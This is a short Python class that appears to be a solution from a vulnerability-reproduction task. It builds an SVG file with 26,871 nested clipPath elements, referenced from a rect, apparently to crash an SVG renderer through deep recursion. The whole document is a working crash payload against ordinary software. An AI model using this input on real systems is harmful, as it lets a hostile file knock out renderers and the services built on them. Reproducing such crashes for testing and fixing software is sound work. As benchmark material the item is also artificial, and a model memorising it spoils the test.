class Solution:
    def solve(self, src_path: str) -> bytes:
        depth = 26871
        parts = []
        for i in range(depth):
            parts.append(f'<clipPath id="cp{i}">')
        parts.append('<rect x="0" y="0" width="10" height="10"/>')
        for i in range(depth):
            parts.append('</clipPath>')
        body = ''.join(parts)
        header = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100" height="100" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
'''
        footer = '''
  <rect width="100" height="100" clip-path="url(#cp0)"/>
</svg>
'''
        full_svg = header + body + footer
        return full_svg.encode('ascii')
